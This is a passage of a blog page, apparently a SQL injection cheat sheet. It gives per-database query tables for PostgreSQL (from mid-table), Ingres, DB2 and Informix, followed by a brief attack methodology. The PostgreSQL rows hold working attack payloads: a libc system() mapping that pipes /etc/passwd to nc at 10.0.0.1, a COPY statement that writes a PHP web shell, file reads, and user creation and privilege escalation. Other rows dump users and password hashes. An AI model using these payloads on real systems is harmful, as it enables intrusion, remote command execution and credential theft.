+<td>Generally not possible in postgres.&nbsp; However if <a target="_blank" rel="noopener" href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html">contrib/dblink</a>is installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights):<p></p>
+<pre>SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);</pre>
+<p>Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.</p></td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT; — privSELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080’); — priv, commands run as postgres/pgsql OS-level user</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>CREATE TABLE mydata(t text);<br>
+COPY mydata FROM ‘/etc/passwd’; — priv, can read files which are readable by postgres OS-level user<br>
+…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; — get data back one row at a time<br>
+…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; — get data back one row at a time …<br>
+DROP TABLE mytest mytest;Write to a file:<p></p>
+<p>CREATE TABLE mytable (mycol text);<br>
+INSERT INTO mytable(mycol) VALUES (‘&lt;? pasthru($_GET[cmd]); ?&gt;’);<br>
+COPY mytable (mycol) TO ‘/tmp/test.php’; –priv, write files as postgres OS-level user.&nbsp; Generally you won’t be able to write to the web root, but it’s always work a try.<br>
+— priv user can also read/write files by <a target="_blank" rel="noopener" href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">mapping libc functions</a></p></td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT inet_server_addr(); — returns db server IP address (or null if using local connection)<br>
+SELECT inet_server_port(); — returns db server IP address (or null if using local connection)</td>
+</tr>
+<tr>
+<td>Create Users</td>
+<td>CREATE USER test1 PASSWORD ‘pass1’; — priv<br>
+CREATE USER test1 PASSWORD ‘pass1’ CREATEUSER; — priv, grant some privs at the same time</td>
+</tr>
+<tr>
+<td>Drop Users</td>
+<td>DROP USER test1; — priv</td>
+</tr>
+<tr>
+<td>Make User DBA</td>
+<td>ALTER USER test1 CREATEUSER CREATEDB; — priv</td>
+</tr>
+<tr>
+<td>&nbsp;Location of DB files</td>
+<td>SELECT current_setting(‘data_directory’); — priv<br>
+SELECT current_setting(‘hba_file’); — priv</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>template0<br>
+template1</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="Ingres-Injection"><a href="#Ingres-Injection" class="headerlink" title="Ingres Injection"></a>Ingres Injection</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>select dbmsinfo(‘_version’);</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 123; — comment<br>
+select 123; /* comment */</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>select dbmsinfo(‘session_user’);<br>
+select dbmsinfo(‘system_user’);</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>First connect to iidbdb, then:<br>
+SELECT name, password FROM&nbsp;iiuser; — or<br>
+SELECT own FROM iidatabase;</td>
+</tr>
+<tr>
+<td>Create Users</td>
+<td>create user testuser with password = ‘testuser’;– priv</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>First connect to iidbdb, then:<br>
+select name, password from iiuser;</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>select dbmsinfo(‘db_admin’);<br>
+select dbmsinfo(‘create_table’);<br>
+select dbmsinfo(‘create_procedure’);<br>
+select dbmsinfo(‘security_priv’);<br>
+select dbmsinfo(‘select_syscat’);<br>
+select dbmsinfo(‘db_privileges’);<br>
+select dbmsinfo(‘current_priv_mask’);</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>select dbmsinfo(‘database’);</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT name FROM iidatabase; — connect to iidbdb</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>select column_name, column_datatype, table_name, table_owner from iicolumns;</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>select table_name, table_owner from iitables;<br>
+select relid, relowner, relloc from iirelation;<br>
+select relid, relowner, relloc from iirelation where relowner != ‘$ingres’;</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>SELECT table_name, table_owner FROM iicolumns WHERE column_name = ‘value’</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>Astoundingly, this <a target="_blank" rel="noopener" href="http://community.ingres.com/forums/viewtopic.php?p=6050">doesn’t</a>seem to be possible!&nbsp; This is as close as you can get:select top 10 blah from table;<br>
+select first 10 blah form table;</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>select substr(‘abc’, 2, 1); — returns ‘b’</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>The function “bit_and” exists, but seems hard to use.&nbsp; Here’s an<br>
+example of ANDing 3 and 5 together.&nbsp; The result is a “byte” type<br>
+with value ?01:select substr(bit_and(cast(3 as byte), cast(5 as byte)),1,1);</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>TODO<br>
+(The “ascii” function exists, but doesn’t seem to do what I’d expect.)</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>select cast(123 as varchar);<br>
+select cast(‘123’ as integer);</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>select ‘abc’ || ‘def’;</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>???See <a target="_blank" rel="noopener" href="http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>Impossible?</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT dbmsinfo(‘ima_server’)</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>SELECT dbdev, ckpdev, jnldev, sortdev FROM iidatabase WHERE name = ‘value’ — primary location of db<br>
+SELECT lname FROM iiextend WHERE dname = ‘value’ — extended location of db<br>
+SELECT are FROM iilocations where lname = ‘value’ —&nbsp;all area (ie directory) linked with a location</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>SELECT name FROM iidatabase WHERE own = ‘$ingres’ — connect to iidbdb</td>
+</tr>
+<tr>
+<td>Installing Locally</td>
+<td>The Ingres database can be downloaded for free from <a target="_blank" rel="noopener" href="http://esd.ingres.com/">http://esd.ingres.com/</a><br>
+A pre-built Linux-based Ingres Database Server can be download from <a target="_blank" rel="noopener" href="http://www.vmware.com/appliances/directory/832">http://www.vmware.com/appliances/directory/832</a></td>
+</tr>
+<tr>
+<td>Database Client</td>
+<td>TODO<br>
+There is a client called “sql” which can be used for local connections (at least) in the&nbsp; database server package above.</td>
+</tr>
+<tr>
+<td>Logging in from command line</td>
+<td>$ su –&nbsp; ingres<br>
+$ sql iidbdb<br>
+* select dbmsinfo(‘_version’); go</td>
+</tr>
+<tr>
+<td>Identifying on the network</td>
+<td>TODO</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="DB2-Injection"><a href="#DB2-Injection" class="headerlink" title="DB2 Injection"></a>DB2 Injection</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>select versionnumber, version_timestamp from sysibm.sysversions;</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>select blah from foo; — comment like this</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>select user from sysibm.sysdummy1;<br>
+select session_user from sysibm.sysdummy1;<br>
+select system_user from sysibm.sysdummy1;</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>N/A (I think DB2 uses OS-level user accounts for authentication.)Database authorities (like roles, I think) can be listed like this:<br>
+select grantee from syscat.dbauth;</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>N/A (I think DB2 uses OS-level user accounts for authentication.)</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>select * from syscat.tabauth; — privs on tables<br>
+select * from syscat.dbauth where grantee = current user;<br>
+select * from syscat.tabauth where grantee = current user;<br>
+select * from SYSIBM.SYSUSERAUTH —&nbsp;List db2 system privilegies</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>select current server from sysibm.sysdummy1;</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT schemaname FROM syscat.schemata;</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>select name, tbname, coltype from sysibm.syscolumns;</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>select name from sysibm.systables;</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>select tbname from sysibm.syscolumns where name=’username’</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>select name from (SELECT name FROM sysibm.systables order by<br>
+name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only;</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1;&nbsp; — returns b</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td><a target="_blank" rel="noopener" href="http://www.tar.hu/sqlbible/sqlbible0084.html">This page</a> seems to indicate that DB2 has no support for bitwise operators!</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>select chr(65) from sysibm.sysdummy1; — returns ‘A’</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>select ascii(‘A’) from sysibm.sysdummy1; — returns 65</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT cast(‘123’ as integer) FROM sysibm.sysdummy1;<br>
+SELECT cast(1 as char) FROM sysibm.sysdummy1;</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1; — returns ‘abc’<br>
+select ‘a’ || ‘b’ from sysibm.sysdummy1; — returns ‘ab’</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>???See <a target="_blank" rel="noopener" href="http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>TODO</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="Informix"><a href="#Informix" class="headerlink" title="Informix"></a>Informix</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE tabid = 1;<br>
+SELECT DBINFO(‘version’, ‘server-type’) FROM systables WHERE tabid = 1;<br>
+SELECT DBINFO(‘version’, ‘major’), DBINFO(‘version’, ‘minor’), DBINFO(‘version’, ‘level’) FROM systables WHERE tabid = 1;<br>
+SELECT DBINFO(‘version’, ‘os’) FROM systables WHERE tabid = 1; — T=Windows, U=32 bit app on 32-bit Unix, H=32-bit app running on 64-bit Unix, F=64-bit app running on 64-bit unix</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>select 1 FROM systables WHERE tabid = 1; — comment</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>SELECT USER FROM systables WHERE tabid = 1;<br>
+select CURRENT_ROLE FROM systables WHERE tabid = 1;</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>select username, usertype, password from sysusers;</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>select tabname, grantor, grantee, tabauth FROM systabauth join systables on systables.tabid = systabauth.tabid; — which tables are accessible by which users<br>
+select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid; — which procedures are accessible by which users</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>SELECT DBSERVERNAME FROM systables where tabid = 1; — server name</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>select name, owner from sysdatabases;</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>select tabname, owner FROM systables;<br>
+select tabname, viewtext FROM sysviews&nbsp; join systables on systables.tabid = sysviews.tabid;</td>
+</tr>
+<tr>
+<td>List Stored Procedures</td>
+<td>select procname, owner FROM sysprocedures;</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid where colname like ‘%pass%’;</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc; — selects the 10th row</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT SUBSTRING(‘ABCD’ FROM 3 FOR 1) FROM systables where tabid = 1; — returns ‘C’</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>select bitand(6, 1) from systables where tabid = 1; — returns 0<br>
+select bitand(6, 2) from systables where tabid = 1; — returns 2</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>select ascii(‘A’) from systables where tabid = 1;</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>select cast(‘123’ as integer) from systables where tabid = 1;<br>
+select cast(1 as char) from systables where tabid = 1;</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT ‘A’ || ‘B’ FROM systables where tabid = 1; — returns ‘AB’<br>
+SELECT concat(‘A’, ‘B’) FROM systables where tabid = 1; — returns ‘AB’</td>
+</tr>
+<tr>
+<td>String Length</td>
+<td>SELECT tabname, length(tabname), char_length(tabname), octet_length(tabname) from systables;</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>select tabid, case when tabid&gt;10 then “High” else ‘Low’ end from systables;</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT DBINFO(‘dbhostname’) FROM systables WHERE tabid = 1; — hostname</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>These are the system databases:<br>
+sysmaster<br>
+sysadmin*<br>
+sysuser*<br>
+sysutils*</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="Injection-Methodology"><a href="#Injection-Methodology" class="headerlink" title="Injection Methodology"></a>Injection Methodology</h2><h3 id="Detect"><a href="#Detect" class="headerlink" title="Detect"></a>Detect</h3><ul>
+<li>Detect the injection (tool or manual)</li>
+<li>Determine injection type (integer or string)</li>
+</ul>
+<h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><ul>
+<li>Error-based Injection (Easiest)</li>
+<li>Union-based Injection (Data extraction)</li>
+<li>Blind Injection (worst case last resort)</li>
+</ul>
+<h2 id="Advanced-Injection-Techniques"><a href="#Advanced-Injection-Techniques" class="headerlink" title="Advanced Injection Techniques"></a>Advanced Injection Techniques</h2><p><a target="_blank" rel="noopener" href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/</a><br><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/">https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/</a></p>
+<h3 id="UNION-Injection"><a href="#UNION-Injection" class="headerlink" title="UNION Injection"></a>UNION Injection</h3><h3 id="Error-Based-Injection"><a href="#Error-Based-Injection" class="headerlink" title="Error-Based Injection"></a>Error-Based Injection</h3><h3 id="Blind-Injection"><a href="#Blind-Injection" class="headerlink" title="Blind Injection"></a>Blind Injection</h3><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://owasp.org/www-chapter-belgium/assets/2010/2010-06-16/Advanced_SQL_InjectionV2.pdf">https://owasp.org/www-chapter-belgium/assets/2010/2010-06-16/Advanced_SQL_InjectionV2.pdf</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              1111-11-11 11:11:11
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-Injection"><span class="toc-text">MySQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-Injection"><span class="toc-text">Oracle Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Injection"><span class="toc-text">MSSQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL-Injection"><span class="toc-text">PostgreSQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ingres-Injection"><span class="toc-text">Ingres Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DB2-Injection"><span class="toc-text">DB2 Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Informix"><span class="toc-text">Informix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Injection-Methodology"><span class="toc-text">Injection Methodology</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Detect"><span class="toc-text">Detect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack"><span class="toc-text">Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Injection-Techniques"><span class="toc-text">Advanced Injection Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION-Injection"><span class="toc-text">UNION Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Based-Injection"><span class="toc-text">Error-Based Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-Injection"><span class="toc-text">Blind Injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-text">References</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2023 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SQL%20Injection + '&url=' + http%3A%2F%2Fexample.com%2Fsql-injection%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/sql-injection/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
